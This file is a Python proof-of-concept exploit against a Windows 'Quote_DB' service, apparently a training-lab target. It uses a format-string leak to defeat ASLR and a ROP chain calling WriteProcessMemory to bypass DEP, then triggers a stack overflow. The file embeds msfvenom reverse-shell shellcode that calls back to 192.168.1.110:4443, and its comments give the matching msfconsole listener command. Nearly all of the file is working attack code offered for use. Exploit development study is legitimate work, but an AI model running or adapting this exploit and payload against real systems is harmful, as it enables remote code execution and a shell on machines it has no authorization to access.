#!/usr/bin/python3

# Quote_DB PoC
# William Moody, 07.06.2021

from functools import update_wrapper
import socket
import sys
from struct import pack, unpack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 3700

# ===

def send(opcode, data):
    buf  = pack("<I", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None

# ===

def get_quote(index):
    return send(901, pack("<I", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)

# ===

print("[+] Getting base address...")

quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
base_str = get_quote(quote_id).split(b" ")[2].decode()
base = (int(base_str, 16) // 0x10000) * 0x10000

print("    -- " + hex(base))

# ===

size = 5000
ropSize = 500

# ===

# Bad Characters
# = 0x00 0x0a 0x20 0x28 0x80 0x81 0x86

# Reverse Shell
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110LPORT=4443 -b "\x00\x0a\x20\x80\x81\x86" EXITFUNC=thread -f python -v shellcode
# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD payload/windows/shell_reverse_tcp; set LHOST 192.168.1.110; set lport 4443; exploit"

shellcode =  b""
shellcode += b"\xbe\x61\xbf\x32\x68\xda\xd1\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x72\x12\x83\xc2\x04"
shellcode += b"\x03\x13\xb1\xd0\x9d\x2f\x25\x96\x5e\xcf\xb6"
shellcode += b"\xf7\xd7\x2a\x87\x37\x83\x3f\xb8\x87\xc7\x6d"
shellcode += b"\x35\x63\x85\x85\xce\x01\x02\xaa\x67\xaf\x74"
shellcode += b"\x85\x78\x9c\x45\x84\xfa\xdf\x99\x66\xc2\x2f"
shellcode += b"\xec\x67\x03\x4d\x1d\x35\xdc\x19\xb0\xa9\x69"
shellcode += b"\x57\x09\x42\x21\x79\x09\xb7\xf2\x78\x38\x66"
shellcode += b"\x88\x22\x9a\x89\x5d\x5f\x93\x91\x82\x5a\x6d"
shellcode += b"\x2a\x70\x10\x6c\xfa\x48\xd9\xc3\xc3\x64\x28"
shellcode += b"\x1d\x04\x42\xd3\x68\x7c\xb0\x6e\x6b\xbb\xca"
shellcode += b"\xb4\xfe\x5f\x6c\x3e\x58\xbb\x8c\x93\x3f\x48"
shellcode += b"\x82\x58\x4b\x16\x87\x5f\x98\x2d\xb3\xd4\x1f"
shellcode += b"\xe1\x35\xae\x3b\x25\x1d\x74\x25\x7c\xfb\xdb"
shellcode += b"\x5a\x9e\xa4\x84\xfe\xd5\x49\xd0\x72\xb4\x05"
shellcode += b"\x15\xbf\x46\xd6\x31\xc8\x35\xe4\x9e\x62\xd1"
shellcode += b"\x44\x56\xad\x26\xaa\x4d\x09\xb8\x55\x6e\x6a"
shellcode += b"\x91\x91\x3a\x3a\x89\x30\x43\xd1\x49\xbc\x96"
shellcode += b"\x76\x19\x12\x49\x37\xc9\xd2\x39\xdf\x03\xdd"
shellcode += b"\x66\xff\x2c\x37\x0f\x6a\xd7\xd0\xf0\xc3\xd6"
shellcode += b"\x4e\x99\x11\xd8\x9f\x02\x9f\x3e\xf5\xa4\xc9"
shellcode += b"\xe9\x62\x5c\x50\x61\x12\xa1\x4e\x0c\x14\x29"
shellcode += b"\x7d\xf1\xdb\xda\x08\xe1\x8c\x2a\x47\x5b\x1a"
shellcode += b"\x34\x7d\xf3\xc0\xa7\x1a\x03\x8e\xdb\xb4\x54"
shellcode += b"\xc7\x2a\xcd\x30\xf5\x15\x67\x26\x04\xc3\x40"
shellcode += b"\xe2\xd3\x30\x4e\xeb\x96\x0d\x74\xfb\x6e\x8d"
shellcode += b"\x30\xaf\x3e\xd8\xee\x19\xf9\xb2\x40\xf3\x53"
shellcode += b"\x68\x0b\x93\x22\x42\x8c\xe5\x2a\x8f\x7a\x09"
shellcode += b"\x9a\x66\x3b\x36\x13\xef\xcb\x4f\x49\x8f\x34"
shellcode += b"\x9a\xc9\xaf\xd6\x0e\x24\x58\x4f\xdb\x85\x05"
shellcode += b"\x70\x36\xc9\x33\xf3\xb2\xb2\xc7\xeb\xb7\xb7"
shellcode += b"\x8c\xab\x24\xca\x9d\x59\x4a\x79\x9d\x4b"

# ===

rop = [
# 1. Get ESP (in eax)
    0x402ac9,       # xor eax, eax ; ret
                    # Sets EAX to 0

    0x401fd6,       # or eax, esp ; ret
                    # Sets EAX to the value of ESP

                    # Results: EAX contains the value of stack pointer (ESP)

# 2. Get dummy call addr (in ebx)
    0x4040f3,       # pop ecx ; ret
                    # EAX has the value of saved ESP.
    0x1ec,          # EAX(ESP) + 0x1ec = skeleton value 'aaaa'
                    # 'aaaa' = 0x010d78cc  (0x61616161)


    0x40eb7d,       # mov edx, eax ; mov edx, eax ; ret
                    # Moves EAX(ESP) to EDX.
                    # Reason: To add ECX to EDX to manipulate saved ESP

    0x401ff3,       # add edx, ecx ; ret
    0x402ce8,       # mov eax, edx
                    # Return saved ESP in EDX to EAX

    0x401fe0,       # mov ebx, eax ; ret
                    # Saved ESP is now in EBX also.

# 3. Deref WriteProcessMemory (in eax)
    0x4030d7,       # pop eax ; pop ecx ; ret
                    # Place VirtualAlloc into EAX
    0x0044a1fc,       # base + iat + WriteProcessMemory = 0x77932510 KERNEL32!WriteProcessMemoryStub
    0xffffffff,     # junk for pop ecx

    0x410515,       # mov eax, [eax] ; ret
                    # Derefernces the address in EAX to get the actual function pointer
                    # of WriteProcessMemory.

                    # Before instruction: EAX contains 0x0044a1e8
                    # During instruction: CPU reads the value within 0x0044a1e8
                    # After  instruction: The value 0x75ac81b0 (KERNEL32!WriteProcessMemoryStub)
                    #                     is moved into the EAX register.

# 4. 0x61616161 Write WriteProcessMemory to dummy + 0x0
    0x401fe7,       # mov [ebx], eax ; ret
                    # Move WriteProcessMemory Pointer into EBX. (Skeleton location 0x61616161)

# 5. Get shellcode addr (in eax)
    0x4040f3,       # pop ecx ; ret
    0x1c,           # hex(28)

    0x401ff3,       # add edx, ecx ; ret
                    # Adds 0x18 to EDX (which contains original skeleton call)
                    # EDX now points to shellcode address parameter

    0x402ce8,       # mov eax, edx
                    # EDX moves shellcode address parameter address to EAX

                    # Result: EAX contains the address of the shellcode
                    #         EBX points to skeleton call address. (0x61616161 = 0x75ac81b0)


# 6. 0x62626262 Get dummy call addr + 0x4 (in ebx) Ret parameter

                    # Result: EBX is on skeleton call + 4 (0x62626262)

# 7. Write shellcode addr to dummy + 0x4 Ret parameter
#    0x401fe7,       # mov [ebx], eax ; ret
                    # Results: Shellcode is written to 0x62626262

# 8. 0x64646464 Get dummy call addr + 0x10 (in ebx)
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 0x10 (0x64646464)
                    #          Skipped 12 bytes because:
                    #          Ret Shellcode is done
                    #          hProcess is done (0xffffffff)
                    #          lpBaseAddress is done (0x00491d10)
                    #          (NO ASLR in main_dep_wpm.exe module)

# 9. Get dummy call addr + 0x10 (in ebx)
    0x401fe7,       # mov [ebx], eax
                    # 0x011678e8 Shellcode Stack Address (src)

# 10. 0x64646464 Get skeleton call addr + 0x14
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 0x14 (0x66666666)


                    # All Skeleton values completed
                    # End   of ROP 1
                    # Start of ROP 2
                    # ROP 2 will encode the shellcode to replace bad characters
                    # bad characters: 0x00 0x0a 0x20 0x28 0x80 0x81 0x86


# 11. Align esp with dummy call (ebx-8)
    0x4040f3,       # pop ecx
    0xffffffe4,     # 0xffffffe4    = -0x1c (-28)
    0x401ff3,       # add edx, ecx  = edx - 0x24
    0x402ce8,       # mov eax, edx
    0x401fe0,       # mov ebx, eax
    0x401fe3,       # xchg ebx, esp ; dec ecx ; ret

                    # Results: Return SAVED ESP from EAX to CURRENT ESP

]
rop = b"".join([pack("<I", r) for r in rop])

# ===

dummy  = b"aaaa"                # WriteProcessMemory     <- The Call
dummy += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave
dummy += pack("<I", 0xffffffff) # hProcess               <- (-0x1 Current Process)
dummy += pack("<I", 0x00410640) # lpBaseAddress          <- Code Cave Address (dst)
dummy += b"dddd"                # lpBuffer               <- Shellcode (STACK) (src)
dummy += pack("<I", 0x190)      # nSize                  <- Size of Shellcode
dummy += pack("<I", 0x00423010) # lpNumberofBytesWritten <- Some writable address

# ===

buf  = b"A" * 2060
buf += rop                      # Setup WriteProcessMemory paramters
buf += b"C" * (ropSize - len(rop))
buf += dummy
buf += shellcode

# ===

print("[+] Triggering overflow...")

bad_request(buf)
